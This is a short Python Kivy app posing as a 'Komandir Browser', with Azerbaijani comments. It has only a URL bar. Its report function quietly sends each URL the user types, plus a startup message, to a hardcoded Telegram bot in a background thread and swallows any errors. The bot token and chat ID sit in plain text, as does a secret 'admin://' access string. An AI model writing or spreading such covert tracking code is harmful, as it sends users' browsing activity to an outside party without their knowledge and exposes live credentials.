from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
import requests
import threading

class KomandirBrowser(App):
    def build(self):
        self.title = "Komandir Browser"
        layout = BoxLayout(orientation='vertical')
        # Sənin axtarış panelin
        self.url_bar = TextInput(text='https://google.com', multiline=False, size_hint_y=None, height='100dp')
        self.url_bar.bind(on_text_validate=self.on_enter)
        layout.add_widget(self.url_bar)
        
        # Giriş siqnalı
        self.report("🚀 Sistem Sıfırdan Aktivləşdi!")
        return layout

    def on_enter(self, instance):
        url = self.url_bar.text
        if url == "admin://ismail20106":
            self.report("⚠️ Komandir gizli giriş etdi!")
        else:
            self.report(f"🌐 Girilən sayt: {url}")

    def report(self, msg):
        token = "7292211995:AAH_O35C992fL9rC1vB-z16lG9y7G806YkY"
        chat = "6718507746"
        def _bg():
            try: requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat}&text={msg}")
            except: pass
        threading.Thread(target=_bg).start()

if __name__ == "__main__":
    KomandirBrowser().run()
    
